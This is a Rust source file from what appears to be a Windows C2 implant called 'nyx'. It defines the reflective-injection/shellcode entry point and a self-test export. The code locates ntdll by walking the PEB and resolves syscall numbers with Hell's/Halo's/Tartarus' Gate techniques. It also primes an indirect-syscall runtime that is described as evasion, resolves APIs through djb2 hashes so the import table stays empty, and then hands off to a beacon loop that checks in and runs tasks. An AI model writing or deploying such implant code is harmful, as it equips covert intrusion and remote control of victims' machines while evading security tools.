//! PIC entry point + task loop bootstrap.
//!
//! For a `cdylib`/shellcode implant the "entry" is an exported function the
//! loader calls (reflective DLL injection) or a thread the host spins up. It:
//!   1. locates ntdll + resolves the API set it needs (no allocation yet),
//!   2. the global allocator self-bootstraps on first `alloc`,
//!   3. runs the beacon loop: check-in → receive tasks → execute → repeat.
//!
//! All Windows-only. On the dev host this module is excluded by cfg.
//!
//! The real PIC extraction (Stardust-style sRDI) turns the cdylib into raw
//! position-independent shellcode whose first byte is the entry below. Until
//! that extraction step exists, the function is the reflective entry a
//! host-side loader calls after mapping the DLL.

#![cfg(target_os = "windows")]

use crate::resolve::LiveNtdll;

/// The reflective/PIC entry. Resolves ntdll, builds the SSN table, primes the
/// indirect-syscall runtime, then enters the beacon loop.
///
/// Marked `#[no_mangle]` so it survives `opt-level="z"` and is the address sRDI
/// extraction marks as the entry point.
#[no_mangle]
pub unsafe extern "system" fn nyx_entry() {
    // 1. PEB-walk ntdll + resolve the SSN table (validates resolve.rs).
    let Some(ntdll) = LiveNtdll::locate() else {
        core::hint::spin_loop();
        return;
    };
    let _ssn_table = ntdll.resolve_table_owned();

    // 2. Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs.
    //    This is what turns nyx_evasion from an algorithm into a live runtime.
    let _syscall_rt = crate::syscalls::Runtime::init();

    // 3. Enter the beacon loop (WinHTTP check-in + task loop).
    crate::beacon::beacon_loop();
}

/// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
/// table, and exits the process with a code reporting the result:
///   - exit code = number of SSNs resolved (>0 = PEB walk + resolve worked)
///   - exit code = 0xFFFFFFFF = ntdll could not be located
///
/// Invoke via: `rundll32 nyx_implant_win.dll,nyx_selftest` then check
/// `%ERRORLEVEL%`. This validates the evasion-runtime chain (PEB walk → export
/// table → SSN resolution) on a real Windows host without any network activity
/// or persistence — a benign closed-loop check.
/// Exit with `code` via the resolved ExitProcess; traps if unavailable.
unsafe fn report_exit(exit_proc: Option<usize>, code: u32) -> ! {
    if let Some(e) = exit_proc {
        let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
        f(code);
    }
    loop { core::hint::spin_loop(); }
}

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");

    // Pure no-alloc self-test: PEB walk -> ntdll -> count exports -> report.
    // No Vec, no String, no alloc — isolates whether alloc is the problem.
    let base = match LiveNtdll::locate_base() {
        Some(b) => b,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(dd_off) as *const u32);
    let n_names: u32 = if export_rva == 0 {
        0
    } else {
        let dir = base.add(export_rva as usize) as *const crate::resolve::ExportDirectory;
        (*dir).number_of_names
    };

    // Manual NtAllocateVirtualMemory test (bypass the allocator machinery).
    // Resolve the fn, call it directly with a stack buffer, report status.
    let ntav = crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory");
    if ntav.is_none() {
        report_exit(exit_proc, 0x800);
    }
    let f: unsafe extern "system" fn(*mut core::ffi::c_void, *mut *mut core::ffi::c_void, *mut usize, *mut usize, u32, u32) -> i32 = core::mem::transmute(ntav.unwrap());
    let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut zb: usize = 0;
    let mut sz: usize = 4096;
    let cur: *mut core::ffi::c_void = (-1isize) as *mut core::ffi::c_void;
    let status = f(cur, &mut base, &mut zb, &mut sz, 0x3000, 0x04);
    // Force allocator resolution (sets the static NT_ALLOC) BEFORE any Vec use.
    crate::ntalloc::force_resolve();
    // Full SSN resolve: LiveNtdll::locate() -> named_exports() (allocs) ->
    // resolve_table_owned() (Hell's/Halo's/Tartarus' Gate over live ntdll).
    // Exit 0x100 + N where N = resolved SSN count.
    let ntdll = match LiveNtdll::locate() {
        Some(n) => n,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let table = ntdll.resolve_table_owned();
    let ssn_count = table.iter().filter(|(_, ssn)| *ssn != u32::MAX).count() as u32;
    report_exit(exit_proc, 0x100 + ssn_count);
}

/// Resolve a function in a loaded module by (module name, function name).
/// Returns the absolute address. Both via PEB walk + export table (no IAT).
unsafe fn resolve_export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
    let mod_hash = djb2_hash(module);
    let fn_hash = djb2_hash(func);
    let peb = peb_ptr()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    while head as *const u8 != start {
        let entry = head as *mut crate::resolve::ListEntry;
        let nb = (*entry).base_dll_name.buffer;
        let nl = (*entry).base_dll_name.length as usize / 2;
        if !nb.is_null() && nl > 0 {
            let chars = core::slice::from_raw_parts(nb, nl);
            if djb2_hash_u16(chars) == mod_hash {
                let base = (*entry).dll_base as *mut u8;
                return export_addr_by_hash(base, fn_hash);
            }
        }
        head = (*entry).in_load_order_links.flink;
    }
    None
}

/// djb2 over ASCII bytes (lowercased), matching the export table's storage.
fn djb2_hash(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        h = h.wrapping_mul(33).wrapping_add(b.to_ascii_lowercase() as u32);
    }
    h
}

/// djb2 over UTF-16 (low byte only, lowercased) — for the PEB's Unicode module names.
fn djb2_hash_u16(chars: &[u16]) -> u32 {
    let mut h: u32 = 5381;
    for &c in chars {
        let lo = (c & 0xff) as u8;
        h = h.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
    }
    h
}

/// Walk a module's export table for a function whose name hashes to `fn_hash`.
/// Returns its absolute address.
unsafe fn export_addr_by_hash(base: *mut u8, fn_hash: u32) -> Option<usize> {
    use crate::resolve::ExportDirectory;
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(dd_off) as *const u32);
    if export_rva == 0 {
        return None;
    }
    let dir = base.add(export_rva as usize) as *const ExportDirectory;
    let n = (*dir).number_of_names as usize;
    let names = base.add((*dir).address_of_names as usize) as *const u32;
    let ordinals = base.add((*dir).address_of_name_ordinals as usize) as *const u16;
    let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
    for i in 0..n {
        let name_rva = *names.add(i);
        let name_ptr = base.add(name_rva as usize);
        // Hash the C string.
        let mut h: u32 = 5381;
        let mut p = name_ptr;
        while *p != 0 {
            h = h.wrapping_mul(33).wrapping_add((*p).to_ascii_lowercase() as u32);
            p = p.add(1);
        }
        if h == fn_hash {
            let ord = *ordinals.add(i) as usize;
            let fn_rva = *funcs.add(ord);
            return Some(base.add(fn_rva as usize) as usize);
        }
    }
    None
}

#[cfg(target_arch = "x86_64")]
unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
    let peb: *mut crate::resolve::Peb;
    core::arch::asm!(
        "mov {p}, gs:[0x60]",
        p = out(reg) peb,
        options(nostack, preserves_flags, readonly),
    );
    Some(peb)
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn peb_ptr() -> Option<*mut crate::resolve::Peb> {
    None
}
